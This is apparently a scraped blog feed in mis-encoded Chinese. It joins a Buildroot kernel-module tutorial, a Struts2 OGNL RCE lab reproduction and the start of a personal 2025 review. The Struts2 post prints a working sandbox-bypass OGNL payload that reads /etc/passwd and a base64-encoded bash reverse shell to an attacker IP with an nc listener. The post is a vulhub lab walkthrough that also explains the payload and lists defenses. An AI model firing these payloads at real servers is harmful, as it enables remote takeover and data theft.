/* å¸è½½å½æ°ï¼é©±å¨åºå£ï¼ï¼å½é©±å¨è¢« rmmod å¸è½½æ¶èªå¨æ§è¡ */
static void __exit helloworld_exit(void)
{
    printk("helloworld_exit\r\n");
}

/* ä¸é¢è¿ä¸¤è¡ï¼åè¯åæ ¸å¥å£ååºå£åå«æ¯åªä¸¤ä¸ªå½æ° */
module_init(helloworld_init);
module_exit(helloworld_exit);

/* è¿3ä¸ªæ¯æ¨¡åä¿¡æ¯å£°æ */
MODULE_LICENSE("GPL v2");               /* æ¨¡åè®¸å¯è¯ */
MODULE_VERSION("1.0");                  /* æ¨¡åçæ¬ï¼å¯é */
MODULE_DESCRIPTION("helloworld Driver");/* æ¨¡åæè¿°ï¼å¯éï¼ä¸è¬ç¨äº lsmod æ¶æ¾ç¤º */
</code></pre>
<p>åè½ç®åè§£éå°±æ¯</p>
<blockquote>
<p>å è½½é©±å¨ï¼æå°<strong>helloworld_init</strong></p>
<p>å¸è½½é©±å¨ï¼æå°<strong>helloworld_exit</strong></p>
</blockquote>
<p>æ¾å°äº¤åç¼è¯å·¥å·è·¯å¾</p>
<pre><code>find prebuilts -name "*gcc" -type f
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245922-1390693708.png" alt="image-20260116221419705" loading="lazy"></p>
<p>ä¸è¬å¨SDKè·¯å¾ä¸æ¾</p>
<h3 id="éç½®makefile">éç½®Makefile</h3>
<pre><code class="language-makefile"># ç®æ æ¶æ
# RK3566 æ¯ ARM64 æ¶æ
ARCH ?= arm64

# äº¤åç¼è¯å·¥å·é¾åç¼
# æç»ä¼ä½¿ç¨ï¼aarch64-linux-gnu-gcc / ld / objcopy ç­
CROSS_COMPILE ?= aarch64-linux-gnu-

# Linux åæ ¸æºç ç®å½
# å¿é¡»æ¯å·²ç»éç½®å¹¶ä¸æ§è¡è¿ prepare/modules_prepare çåæ ¸
#ä½ç¨ï¼åè¯ Makefile ç¨åªä¸ªåæ ¸çæ¬çæºç åå¤´æä»¶è¿è¡ç¼è¯é¾æ¥ã
KDIR := $(HOME)/Desktop/SDK/kernel

# å½åå¤é¨æ¨¡åæºç æå¨ç®å½
# åæ ¸ä¼å¨è¿ä¸ªç®å½ä¸æ¥æ¾ obj-m æå®çæ¨¡åæºç 
PWD  := $(shell pwd)

# è¦ç¼è¯çå¤é¨åæ ¸æ¨¡å
# hello_world.c  â  hello_world.ko
obj-m += hello_world.o

# é»è®¤ç®æ ï¼ç¼è¯åæ ¸æ¨¡å
all:
	# è°ç¨åæ ¸æºç ç®å½ä¸ç Makefile
	# M=$(PWD) è¡¨ç¤ºè¿æ¯ä¸ä¸ªâå¤é¨æ¨¡åâ
	# ARCH / CROSS_COMPILE æå®ç®æ æ¶æåäº¤åç¼è¯å¨
	$(MAKE) -C $(KDIR) M=$(PWD) \
		ARCH=$(ARCH) CROSS_COMPILE=$(CROSS_COMPILE) modules

# æ¸çç¼è¯çæçä¸­é´æä»¶
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

</code></pre>
<p>PSï¼ä¸»è¦å¯»æ¾éç½®</p>
<blockquote>
<p>äº¤åç¼è¯å·¥å·é¾åç¼ï¼aarch64-linux-gnu-</p>
<p>Linux åæ ¸æºç ç®å½è·¯å¾ï¼$(HOME)/Desktop/SDK/kernel</p>
</blockquote>
<h3 id="ç¼è¯">ç¼è¯</h3>
<pre><code>make
</code></pre>
<p>æ¨¡åè¾åºè·¯å¾</p>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224246555-359569486.png" alt="image-20260116222818781" loading="lazy"></p>
<h2 id="é©±å¨æµè¯">é©±å¨æµè¯</h2>
<h3 id="å°é©±å¨å¤å¶è¿rk3566æ¿å¡">å°é©±å¨å¤å¶è¿rk3566æ¿å¡</h3>
<h4 id="ä½¿ç¨adb">ä½¿ç¨ADB</h4>
<p>å¦æADBå·²ç»è¿ä¸æ¿å¡ï¼ååæ­å¼è¿æ¥</p>
<pre><code>exit
</code></pre>
<p>å¯»æ¾æ¿å¡è®¾å¤</p>
<pre><code>adb devices
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224247234-648064983.png" alt="image-20260116223436138" loading="lazy"></p>
<p>å°æ¬å°çé©±å¨æ¨¡åæä»¶åéå°æ¿å¡</p>
<pre><code>adb -s 6c392aca38ad7c4b push F:\Desktop\SSH_Ubuntu18\hello_world.ko /data/local/tmp/hello_world.ko
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248167-2138743187.png" alt="image-20260116223652779" loading="lazy"></p>
<h3 id="å è½½é©±å¨æ¨¡å">å è½½é©±å¨æ¨¡åï¼</h3>
<pre><code>insmod hello_world.ko	
</code></pre>
<p>æ¥ç é©±å¨ ç¸å³æ¥å¿</p>
<pre><code>dmesg | grep -E 'hello'	
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248958-58986670.png" alt="image-20260116223813105" loading="lazy"></p>
<h3 id="å¸è½½æ¨¡åé©±å¨">å¸è½½æ¨¡åé©±å¨</h3>
<pre><code>rmmod hello_world.ko
</code></pre>
<p>æ¥ç é©±å¨ ç¸å³æ¥å¿</p>
<pre><code>dmesg | grep -E 'hello'	
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224249850-1462602200.png" alt="image-20260116223939679" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 22:45">2026-01-16 22:45</span>&nbsp;
<a href="https://www.cnblogs.com/tianwuyvlianshui">æ²æç¦»</a>&nbsp;
éè¯»(<span id="post_view_count">81</span>)&nbsp;
è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19494280);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19494280', targetLink: 'https://www.cnblogs.com/tianwuyvlianshui/p/19494280', title: 'ç¼åä¸ä¸ªBuildroot é©±å¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Apache Struts2 OGNL RCEæ³¨å¥ ]]></title>
    <link>https://www.cnblogs.com/hzhsec/p/19492577</link>
    <guid>598372e94f314ce375369b1e5bdd5ad4</guid>
    <description>
    <![CDATA[ 
		<h2>
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/hzhsec/p/19492577" title="åå¸äº 2026-01-16 16:02">
    <span role="heading" aria-level="2">Apache Struts2 OGNL RCEæ³¨å¥</span>
    

</a>

		</h2>
		    <div id="cnblogs_post_description" style="display: none">
        
        Apache Struts2 OGNL RCEæ¼æ´æ¯ä¸ç§ä¸¥éçè¿ç¨ä»£ç æ§è¡æ¼æ´ï¼æ»å»èéè¿æé æ¶æçOGNLè¡¨è¾¾å¼æ³¨å¥å°HTTPè¯·æ±åæ°ä¸­ï¼å©ç¨Struts2æ¡æ¶å¯¹OGNLè¡¨è¾¾å¼å¤çä¸å½çç¼ºé·ï¼ç»è¿å®å¨æ²ç®±éå¶ï¼æç»å®ç°å¨ç®æ æå¡å¨ä¸æ§è¡ä»»æç³»ç»å½ä»¤ï¼ä»èè·åæå¡å¨æ§å¶æã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="1ä»ä¹æ¯apache-struts2">1.ä»ä¹æ¯Apache Struts2?</h2>
<p>Apache Struts2ï¼ä¹ç§°ä¸º Struts2ï¼æ¯ä¸ä¸ªå¼æºç Java Web åºç¨æ¡æ¶ã<br>
å®ä¸»è¦ç¨äºæå»ºä¼ä¸çº§ <code>Java EE Web</code> åºç¨ç¨åºï¼æä¾ <code>MVC</code>ï¼<code>Model-View-Controller</code>ï¼æ¶ææ¯æï¼å¸®å©å¼åèå¿«éå¼åå¯ç»´æ¤ç Web åºç¨ã</p>
<p>Struts2 åºäº <code>OGNL</code>ï¼<code>Object-Graph Navigation Language</code>ï¼è¡¨è¾¾å¼è¯­è¨æ¥å¤çæ°æ®ç»å®ãè¡¨åéªè¯åå¨æåå®¹æ¸²æç­åè½ãå®æ¯ <code>Struts1</code> çåç»§çæ¬ï¼ä» 2006 å¹´å·¦å³å¼å§æµè¡ï¼ä½ç±äºåå²æ¼æ´è¾å¤ï¼ç°å¨è®¸å¤é¡¹ç®å·²è½¬åæ´ç°ä»£çæ¡æ¶å¦ Spring MVCã</p>
<h2 id="2åç">2.åç</h2>
<p>(1) <strong>OGNL</strong></p>
<p><strong>OGNLä¸è¦ç´ </strong></p>
<ol>
<li>
<p><strong>Expressionï¼è¡¨è¾¾å¼ï¼</strong> å­ç¬¦ä¸²å½¢å¼çæä»¤ï¼åè¯ OGNL âä½ è¦åä»ä¹âã ä¾å­ï¼<code>user.name</code>ã<code>@java.lang.Runtime@getRuntime().exec('calc')</code>ã<code>#session.get('user')</code> ç­</p>
</li>
<li>
<p><strong>Rootï¼æ ¹å¯¹è±¡ï¼</strong> æä½çâä¸»ä½å¯¹è±¡âï¼ä¹å°±æ¯ä½ ä¸»è¦æ³è®¿é®/ä¿®æ¹çå¯¹è±¡ã å¨ Struts2 ä¸­ï¼<strong>Root é»è®¤å°±æ¯ ValueStackï¼å¼æ ï¼</strong>ï¼å¼æ æé¡¶å±éå¸¸æ¯å½åç Action å®ä¾ã â è®¿é® Root å¯¹è±¡çå±æ§æ¶ï¼<strong>ä¸éè¦å ä»»ä½åç¼</strong>ï¼ç´æ¥åå±æ§åå³å¯ã</p>
</li>
<li>
<p><strong>Contextï¼ä¸ä¸æï¼</strong> ä¸ä¸ª Map ç»æï¼OgnlContextï¼ï¼ç¸å½äºâè¿è¡ç¯å¢âã éé¢å­æ¾äºåç§è¾å©å¯¹è±¡ãä¸´æ¶åéãç¯å¢ä¿¡æ¯ç­ã å¨ Struts2 ä¸­ï¼<strong>Context å°±æ¯ ActionContext</strong>ï¼åå«äºï¼</p>
<ul>
<li><code>#parameters</code>ï¼è¯·æ±åæ°ï¼</li>
<li><code>#request</code></li>
<li><code>#session</code></li>
<li><code>#application</code></li>
<li><code>#attr</code>ï¼ä¾æ¬¡æ¥æ¾ pageârequestâsessionâapplicationï¼</li>
<li>å¼æ æ¬èº«ï¼ä½ä¸º Rootï¼<br>
â è®¿é® Context éçå¯¹è±¡ï¼å¿é¡»å  <strong>#</strong> åç¼ï¼ä¾å¦ <code>#session.user</code>ã<code>#parameters.name</code></li>
</ul>
</li>
</ol>
<p><strong>OGNLä¸­çéè¦ç¬¦å·</strong></p>
<p>æä¸ä¸ª<code>#%$</code><br>
<code>%</code></p>
<pre><code>%: å¶ç¨éæ¯å¨æ å¿å±æ§ä¸ºå­ç¬¦ä¸²ç±»åæ¶ï¼è®¡ç®OGNLè¡¨è¾¾å¼çå¼ï¼ç±»ä¼¼JSä¸­çå½æ°eval()ã 
ä¾å¦:&lt;s:url value =â%{items.{title}[0]}â/&gt;ãè·åitemså¯¹è±¡ä¸­titleå±æ§ï¼titleä¸ºæ°ç»ï¼åæ°ç»ç´¢å¼ä¸º0ä½ç½®çå¼
</code></pre>
<p><code>#</code></p>
<pre><code>è®¿é® Contextï¼éæ ¹å¯¹è±¡ï¼éçæ°æ®,å sessionãrequestãparametersãapplication ç­æ¶ä½¿ç¨
ä¾å¦:#session.user #parameters.username #request.get('key')
</code></pre>
<p><code>$</code></p>
<pre><code>1. å¨ struts.xml éç½®æä»¶éå¼ç¨ OGNL
2. å¨å½éåèµæºæä»¶ï¼.propertiesï¼éå¼ç¨ OGNL
ä¾å¦:struts.xml éï¼ èµæºæä»¶ï¼welcome=${user.name}
</code></pre>
<p>(2) <strong>OGNL RCEæ¼æ´åç</strong></p>
<p>OGNL RCEæ¼æ´æ¯ <code>Struts2</code> ä¸­ä¸ç±»å¸¸è§çä¸¥éå®å¨é®é¢ï¼ä¸»è¦æºäºæ¡æ¶å¯¹ <code>OGNL</code> è¡¨è¾¾å¼çå¤çä¸å½ã</p>
<p><code>OGNL</code> æ¯ä¸ç§å¼ºå¤§çè¡¨è¾¾å¼è¯­è¨ï¼ç¨äºè®¿é® Java å¯¹è±¡çå±æ§åæ¹æ³.ä½å¨ <code>Struts2</code> ä¸­ï¼å¦æç¨æ·è¾å¥ï¼å¦ <code>HTTP</code> è¯·æ±å¤´ãåæ°ææ ç­¾å±æ§ï¼è¢«ç´æ¥ç¨äº <code>OGNL</code> æ±å¼ï¼èæ²¡æååéªè¯æè½¬ä¹ï¼å°±ä¼å¯¼è´æ³¨å¥æ»å»ã</p>
<p><strong>æ¼æ´å½±åèå´</strong></p>
<p>OGNL RCE æ¼æ´å½±åäº <code>Struts2</code> çå¤ä¸ªåå²çæ¬ï¼</p>
<ul>
<li>å¸¸è§åå½±åçæ¬ï¼ä» <code>Struts 2.0.0</code> å° <code>2.5.x </code>ç³»åï¼å¦ <code>2.5.25</code> ä¹åï¼ï¼é¨å 6.x æ©æçæ¬æç±»ä¼¼é®é¢ãä½è®¸å¤æ§çæ¬ï¼å¦ 2.3.xï¼å·²åæ­¢æ¯æï¼EOLï¼ã<br>
ä¸æ¯ææ <code>Struts2</code> åºç¨é½æåæ»å»ï¼åå³äºéç½®ï¼å¦æ¯å¦ä½¿ç¨å¼ºå¶ <code>OGNL</code> æ±å¼ææ´é²äºç¹å®æä»¶ï¼ãä½éçç³»ç»ç¹å«å±é©ã</li>
</ul>
<h2 id="3æ¼æ´å¤ç°">3.æ¼æ´å¤ç°</h2>
<p>æ¼æ´å¤ç°ç¯å¢<br>
åå¤å¥½<code>docker</code></p>
<ol>
<li><strong>é¶æºç¯å¢</strong>ï¼ä½¿ç¨ vulhubé¶åºï¼ï¼</li>
</ol>
<pre><code class="language-bash">åévulhubä»åº
git clone --depth 1 https://github.com/vulhub/vulhub.git
å°æ¼æ´å°å
cd vulhub/struts2/s2-061
</code></pre>
<p>æåéå</p>
<pre><code class="language-sh">docker-compose up -d 
</code></pre>
<p>æåå¤±è´¥çå¯ä»¥ä½¿ç¨è¿ä¸ªä»åºçéåæºéç½®å·¥å·:</p>
<pre><code class="language-sh">git clone https://github.com/hzhsec/docker_proxy.git
chmod +x *.sh
./docker-proxy.sh
</code></pre>
<p>åæå</p>
<pre><code class="language-sh">docker-compose up -d 
</code></pre>
<p>ä½¿ç¨docker psæ¥çéåæ¯å¦è¿è¡</p>
<p>è®¿é®ï¼<a href="http://xn--IP-eo8d177o:8080" target="_blank" rel="noopener nofollow">http://é¶æºIP:8080</a><br>
<img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116153643875.png" class="lazyload"></p>
<ul>
<li>å°è¯idæ³¨å¥ä»£ç </li>
</ul>
<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}
urlç¼ç 
http://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D
</code></pre>
<p><img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154120948.png" class="lazyload"><br>
æåå°idçå¼æ´æ¢æ§è¡</p>
<p>å°è¯poc</p>
<pre><code>%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]). (#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]). (#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)). (#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)). (#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("cat /etc/passwd")). (#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}

ç¼ç :
%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D
</code></pre>
<p><img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154307914.png" class="lazyload"><br>
æåè¯»å<code>/etc/passwd</code><br>
<img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154354648.png" class="lazyload"></p>
<p>å°è¯ä¿®æ¹å½ä»¤åå¼¹shell</p>
<pre><code>shellå½ä»¤
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
æ¿æ¢ä¸é¢çcatå½ä»¤
</code></pre>
<p>æ»å»æº:</p>
<pre><code>nc -lvvp 4444 å¯å¨çå¬
</code></pre>
<p><img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154843948.png" class="lazyload"><br>
åépayload</p>
<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D
</code></pre>
<p>æåä¸çº¿:<br>
<img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154954834.png" class="lazyload"></p>
<h3 id="pocåç">pocåç</h3>
<ol>
<li>
<p><strong>è·å Tomcat ç InstanceManager</strong> <code>#instancemanager</code> = <code>#application["org.apache.tomcat.InstanceManager"]</code> â ä» <code>ServletContext</code>ï¼applicationï¼éæ¿å°<code> Tomcat</code> çå®ä¾ç®¡çå¨ï¼å®è½âæ´åânew åºä»»ä½ç±»çå®ä¾ï¼å³ä½¿ OGNL æ²ç®±ä¸åè®¸ï¼ã</p>
</li>
<li>
<p><strong>æ¿å°å½åç ValueStackï¼å¼æ ï¼</strong> <code>#stack</code> = <code>#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]</code> â å¼æ æ¯ <code>Struts2</code> çæ ¸å¿ï¼éé¢å­ç <code>Action</code>ã<code>request</code>ã<code>session</code> ç­ææä¸ä¸æä¿¡æ¯ã</p>
</li>
<li>
<p><strong>ç¨ <code>BeanMap</code> é­æ³ç»è¿è®¿é®éå¶</strong>ï¼ææ ¸å¿çæ²ç®±ç»è¿æå·§ï¼ <code>#bean</code> = <code>#instancemanager.newInstance("org.apache.commons.collections.BeanMap")</code> <code>#bean.setBean(#stack)</code> â åå»ºä¸ä¸ª <code>BeanMap</code>ï¼ä¸ç§è½æä»»æå¯¹è±¡å½ Map ç¨çé»ç§æç±»ï¼ï¼ç¶åæå¼æ å¡è¿å»ã ä¹åå°±è½éè¿ <code>.get("context")</code>ã <code>.get("memberAccess")</code> è¿ç§æ¹å¼ï¼è®¿é®åæ¬ä¸åè®¸ç´æ¥è®¿é®çç§æå­æ®µã</p>
</li>
</ol>
<p>ç»§ç»­é¾å¼æä½ï¼ â åæ¿å° <code>context</code> â åæ¿å° <code>_memberAccess</code>ï¼OGNL çå®å¨ç®¡çå¨å¯¹è±¡ï¼æ§å¶ä»ä¹è½æ§è¡ãä»ä¹ç±»è¢«ç¦æ­¢ï¼</p>
<ol start="4">
<li>
<p><strong>æ¸ç©ºæ²ç®±é»åå</strong>ï¼çæ­£è§£é¤éå¶ï¼ <code>#emptyset = #instancemanager.newInstance("java.util.HashSet") </code> <code>#bean.put("excludedClasses", #emptyset)</code> <code>#bean.put("excludedPackageNames", #emptyset)</code> â æ OGNL çä¸¤ä¸ªé»ååï¼ç¦æ­¢çç±» + ç¦æ­¢çåï¼å¨é¨æ¸ç©ºæç©ºéåã â ä»æ­¤ OGNL ä»ä¹ç±»é½è½ç¨äºï¼ä»ä¹åé½è½è®¿é®äºï¼æ²ç®±å½»åºå¤±æï¼ã</p>
</li>
<li>
<p><strong>åå¤å½ä»¤å¹¶æ§è¡</strong> <code>#arglist</code> = <code>#instancemanager.newInstance("java.util.ArrayList")</code> <code>#arglist.add("cat /etc/passwd")</code> â åå»ºä¸ä¸ªåæ°åè¡¨ï¼éé¢æ¾è¦æ§è¡çå½ä»¤ã</p>
</li>
</ol>
<p><code>#execute</code> = <code>#instancemanager.newInstance("freemarker.template.utility.Execute") #execute.exec(#arglist)</code> â ç¨ Freemarker èªå¸¦ç Execute å·¥å·ç±»æ¥æ§è¡ç³»ç»å½ä»¤ï¼è¿ä¸ªç±»æ¬æ¥ä¸åè®¸è¢« OGNL è°ç¨ï¼ä½ç°å¨æ²ç®±æ²¡äºï¼å°±è½ç¨äºï¼ã</p>
<p>**æ»ç»ï¼ è¿ä¸ªpayload åç¨ Tomcat InstanceManager + BeanMap é­æ³é¾ â æ¾å°å¹¶ä¿®æ¹ OGNL çå®å¨ç®¡çå¨ â æ¸ç©ºææé»åå â æåç¨ Freemarker ç Execute ç±»æ§è¡ cat /etc/passwdã</p>
<h2 id="4æ¼æ´é²å¾¡">4.<strong>æ¼æ´é²å¾¡</strong></h2>
<p>1ãåçº§å°Struts 2çå®å¨çæ¬ï¼æ¯å¦<code>2.3.32</code>æ<code>2.5.16</code>ï¼è¿äºçæ¬åå«äºå¯¹åºçå®å¨ä¿®å¤<br>
2ãç¦ç¨OGNLè¡¨è¾¾å¼çæ§è¡ï¼æèä½¿ç¨Struts 2çå®å¨<code>mechansim</code>ã</p>
<p><strong>åè´£å£°æ</strong><br>
æ¬ææ¡£æåå«çæ¼æ´å¤ç°æ¹æ³ãææ¯ç»èåå©ç¨ä»£ç ï¼<strong>ä»éç¨äºææçå®å¨æµè¯ãæè²å­¦ä¹ ä¸ç ç©¶ç®ç</strong>ã<br>
<strong>ä¸¥ç¦</strong>å¨æªè·å¾æç¡®ææçæåµä¸ï¼å¯¹ä»»ä½ç³»ç»è¿è¡æµè¯ææ»å»ãä»»ä½ä¸å½ä½¿ç¨æå¯¼è´çæ³å¾è´£ä»»ååæï¼åç±ä½¿ç¨èèªè¡æ¿æã<br>
ä½èä¸ææ¡£æä¾èä¸æ¿æä»»ä½å æ»¥ç¨æ¬ææ¡£ä¿¡æ¯èäº§ççç´æ¥æé´æ¥è´£ä»»ãè¯·éµå®æ¨æå¨å°çæ³å¾æ³è§ï¼å¹¶å§ç»è·µè¡è´è´£ä»»çç½ç»å®å¨å®è·µã</p>

</div>
<div class="clear"></div>

		<p class="postfoot">
			posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 16:02">2026-01-16 16:02</span>&nbsp;
<a href="https://www.cnblogs.com/hzhsec">hzhsec</a>&nbsp;
éè¯»(<span id="post_view_count">33</span>)&nbsp;
è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19492577);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19492577', targetLink: 'https://www.cnblogs.com/hzhsec/p/19492577', title: 'Apache Struts2 OGNL RCEæ³¨å¥' })">ä¸¾æ¥</a>

		</p>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æç2025ï¼åé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ· ]]></title>
    <link>https://www.cnblogs.com/HaiJun-Aion/p/19492492</link>
    <guid>25820d93e4fa2de985f04ae28c9f3542</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/HaiJun-Aion/p/19492492" title="åå¸äº 2026-01-16 15:50">
    <span role="heading" aria-level="2">æç2025ï¼åé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ·</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>2025 å¹´ï¼å¦æè®©æç¨ä¸å¥è¯å®æ§ï¼æä¼è¯´ï¼<strong>æå¨åå¼ºï¼ä¹å¨éæ°éæ©èªå·±çäººçç»æã</strong></p>
<p>è¿ä¸å¹´æåäºå¾å¤äºï¼å¤å°æä¸åº¦ä¸æ¢åå¤´çãè¡¨é¢ä¸çï¼æä¸ç´å¨âå¾åâï¼ååå®¹ãåé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ·ãå¯åªææèªå·±ç¥éï¼çæ­£æç£¨äººçä¸æ¯å¿ï¼æ¯é£ç§åå¤åºç°çç¬é´ââæçªç¶æè¯å°ï¼æä¸æ¯å¨å²ï¼ææ¯å¨<strong>è¢«çæ´»æ¨çè·</strong>ã</p>
<p>æç¡®å®æ¿å°äºä¸äºç»æãåå®¹æè¿ççæ¶å»ï¼å°çº¢ä¹¦æ¶¨äºç²ï¼è§é¢åªè¾ä»æå¿èä¹±å°æ¢æ¢é¡ºæï¼æäººå¼å§æ¥é®æãä¿¡æãçè³æ¿æä»è´¹ãé£æ®µæ¶é´ææä¸ç§å¾ç½è§çç¬å®ï¼åªè¦æè¯å­¦ãè¯ç£¨ï¼å¾å¤äºæé½è½åæãé£ç§âæå¥½åä»ä¹é½è½åâçèªä¿¡ï¼å¨è¿ä¸å¹´éåå¤ææä»ä½è°·éæèµ·æ¥ã</p>
<p>ä½åæ ·æ¯è¿ä¸å¹´ï¼æä¹äº¤äºä¸ç¬ä¸è½»çå­¦è´¹ãä¸æ¯é±é£ä¹ç®åï¼æ´æ¯å¯¹äººãå¯¹æºä¼ãå¯¹âçèµ·æ¥å¾ç¾âçæ¿è¯ºçé£ç§å¤©çãææ¾å ä¸ºä¿¡ä»»åäºä¸ä¸ªå¾éçå³å®ï¼ä¹æ¾å¨åäº¬çå¤éæäºæä¸æ¡æ¡æå¼ç®æ¸æ¥ï¼æååç°ä¸æ¯å¼ä¸å¼çé®é¢ï¼èæ¯æåæä¸å»ï¼å°±ä¼æèªå·±èå°æ²¡æ ·å­ã</p>
<p>æä¸æ³æè¿ç¯å¤çåææµæ°´è´¦ï¼ä¹ä¸æ³åæé¸¡æ±¤ãæåªæ³æè¿ä¸å¹´æçå®çé¨åæåºæ¥ï¼ææä¹ä¸ç¹ç¹åå¼ºï¼æä¹è¢«ç°å®æè²ï¼æä¹æ­¢æãæä¹ç»´æãæä¹æèªå·±ä»åºå¢éæ¡åæ¥ã</p>
<hr>
<h2 id="1-æå¼å§æè¡¨è¾¾å½æä¸ä»¶æ­£äº">1. æå¼å§æè¡¨è¾¾å½æä¸ä»¶æ­£äº</h2>
<p>ä¸æå¼å§ï¼ææå¾å¤æ³¨æåæ¾å¨âè¯´æ¸æ¥âè¿ä»¶äºä¸ã</p>
<p>ä»¥åæä¹è¾åºï¼ä½æ´å¤åéæè®°å½ã2025 å¹´ä¸ä¸æ ·ï¼æå¼å§è®¤çç»è¥è¡¨è¾¾ï¼æ¯å¤©é»ç ãæ¯å¤©å°è¯ãæ¯å¤©å¤çãå¬ä¼å·æäºæ´æç¡®çæ­£åé¦ï¼æå ç¯æç« çªç¶è¢«æ¨èµ·æ¥ï¼è¯è®ºåºå¼å§åºç°éçäººçå±é¸£ï¼åå°ä¹å¼å§æäººæ¥é®æé®é¢ãé£ç§æè§å¾å¥å¦ââæåçä¸è¥¿ä¸ååªå±äºæèªå·±ï¼å®å¼å§è¿å¥å«äººççæ´»ã</p>
<p><strong>ä»å¹´ä½¿ç¨æå¤çAI IDE å°±æ¯Traeï¼ä¹åå äºç¬¬ä¸æçTrae å¾ææ´»å¨ï¼è·å¾äºç¬¬äºåï¼Traeç»ææ¥äºå¾å¤æé¿ã</strong></p>
